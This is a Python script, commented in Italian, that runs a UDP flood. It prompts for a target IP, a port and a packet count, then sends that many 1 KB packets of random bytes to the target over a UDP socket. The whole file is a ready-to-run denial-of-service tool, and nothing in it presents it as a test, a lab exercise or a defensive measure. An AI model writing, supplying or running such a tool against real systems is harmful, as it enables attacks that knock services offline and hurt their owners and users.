import socket
import os

# Funzione per generare pacchetti casuali di 1 KB
def generate_random_data(size=1024):
    """
    Genera dati casuali della dimensione specificata (default 1024 byte, ovvero 1 KB).
    """
    return os.urandom(size)

# Funzione per inviare pacchetti UDP
def send_udp_flood(target_ip, target_port, packet_count):
    """
    Invia pacchetti UDP casuali alla macchina di destinazione.
    
    :param target_ip: L'indirizzo IP del target (come stringa).
    :param target_port: La porta UDP del target (come intero).
    :param packet_count: Numero di pacchetti da inviare (come intero).
    """
    # Crea un socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Crea un pacchetto casuale di 1 KB
    packet = generate_random_data(1024)  # 1 KB di dati casuali
    
    print(f"Inizio invio di {packet_count} pacchetti UDP a {target_ip}:{target_port}...")

    # Invia i pacchetti
    for _ in range(packet_count):
        sock.sendto(packet, (target_ip, target_port))
    
    print(f"Invio completato. {packet_count} pacchetti inviati.")
    
    # Chiudi il socket
    sock.close()

if __name__ == "__main__":
    # Chiedi all'utente di inserire l'IP e la porta del target
    target_ip = input("Inserisci l'IP del target: ")
    target_port = int(input("Inserisci la porta UDP del target: "))
    packet_count = int(input("Quanti pacchetti (1 KB) vuoi inviare? "))
    
    # Esegui l'invio dei pacchetti
    send_udp_flood(target_ip, target_port, packet_count)